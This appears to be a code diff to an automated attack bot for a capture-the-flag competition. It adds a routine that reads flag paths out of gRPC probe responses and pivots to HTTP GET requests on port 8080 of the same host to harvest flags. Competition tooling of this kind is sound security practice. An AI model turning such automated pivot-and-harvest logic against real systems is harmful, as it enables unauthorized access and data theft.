@@ -24,6 +24,7 @@ from .exploits import (
     auth_tamper_attempts,
     build_attempts,
     extract_internal_urls,
+    extract_svc_flag_paths,
     observed_attempts,
     observed_grpc_attempts,
     observed_grpc_bootstrap,
@@ -34,6 +35,7 @@ from .flags import FlagPipeline, SubmitClient
 from .llm_advisor import LLMAdvisor, MAX_LLM_CALLS_PER_ROUND
 from .models import (
     Capability,
+    Endpoint,
     ExecutionPlan,
     Outcome,
     RoundBudget,
@@ -435,6 +437,11 @@ class AttackerRuntime:
         self.audit.log("protocol-observed", target=endpoint.key(), scheme="grpc-h2c")
         captured_any = self._process_flags(resp.body, resp.headers)
         evidence_ref = obs.evidence_ref
+        # Health/Probe 응답에 gateway_path가 있으면 동일 L1 HTTP:8080으로 즉시 피벗.
+        captured_any = (
+            self._pivot_satdiag_gateway(endpoint, resp.body, evidence_ref)
+            or captured_any
+        )
         for attempt in observed_grpc_attempts(endpoint.port):
             if self._stop_event.is_set():
                 break
@@ -443,6 +450,10 @@ class AttackerRuntime:
             )
             if result is not None:
                 evidence_ref = result.observation.evidence_ref
+                captured_any = (
+                    self._pivot_satdiag_gateway(endpoint, result.body, evidence_ref)
+                    or captured_any
+                )
             if captured:
                 captured_any = True
                 self.audit.log(
@@ -453,6 +464,35 @@ class AttackerRuntime:
                     reason="det:" + attempt.reason,
                 )
         return True, captured_any
+
+    def _pivot_satdiag_gateway(self, endpoint, body: str, evidence_ref) -> bool:
+        """gRPC 응답의 ``/svc/flag-…`` 경로를 같은 host:8080 GET으로 회수한다(P2-R4)."""
+        if 8080 not in self.config.ports:
+            return False
+        paths = extract_svc_flag_paths(body or "")
+        if not paths:
+            return False
+        http_ep = Endpoint(endpoint.host, 8080)
+        captured_any = False
+        for path in paths:
+            if self._stop_event.is_set():
+                break
+            attempt = Attempt(
+                VulnClass.OTHER, "GET", path,
+                reason="observed:satdiag-gateway-svc-flag",
+            )
+            result, captured = self._execute_attempt(http_ep, attempt, evidence_ref)
+            if captured:
+                captured_any = True
+                self.audit.log(
+                    "hit",
+                    target=http_ep.key(),
+                    path=path,
+                    reason="det:observed:satdiag-gateway-svc-flag",
+                )
+            if result is not None:
+                evidence_ref = result.observation.evidence_ref
+        return captured_any
 
     @staticmethod
     def _cookie_from_headers(headers) -> tuple:
